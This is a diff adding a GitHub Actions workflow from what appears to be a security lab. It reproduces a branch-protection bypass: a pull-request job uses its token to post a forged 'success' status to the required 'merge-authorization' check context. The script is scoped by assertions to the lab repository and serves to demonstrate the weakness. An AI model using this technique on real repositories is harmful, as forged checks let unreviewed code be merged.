@@ -1,0 +1,30 @@
+name: LAB SRC10 PR Status Overwrite Reproducer
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+  statuses: write
+jobs:
+  overwrite-same-context:
+    if: github.repository == '13640226/vorneq-security-lab-branch-protection' && github.head_ref == 'feature/src10'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Post synthetic lab success to PR HEAD
+        env:
+          GH_TOKEN: ${{ github.token }}
+          LAB_PR_HEAD: ${{ github.event.pull_request.head.sha }}
+        run: |
+          python3 - <<'PY'
+          import json, os, re, urllib.request
+          repo=os.environ["GITHUB_REPOSITORY"]; head=os.environ["LAB_PR_HEAD"]
+          assert repo=="13640226/vorneq-security-lab-branch-protection"
+          assert re.fullmatch(r"[0-9a-f]{40}",head)
+          payload=json.dumps({"state":"success","context":"vorneq-lab/merge-authorization","description":"LAB SRC10 untrusted PR overwrote status"}).encode()
+          request=urllib.request.Request(f"https://api.github.com/repos/{repo}/statuses/{head}",data=payload,method="POST",headers={"Authorization":"Bearer "+os.environ["GH_TOKEN"],"Content-Type":"application/json","Accept":"application/vnd.github+json"})
+          with urllib.request.urlopen(request,timeout=15) as response:
+              assert response.status==201
+              print("SYNTHETIC_SRC10_STATUS_POST=201")
+              print("LAB_HEAD_SHA="+head)
+          PY
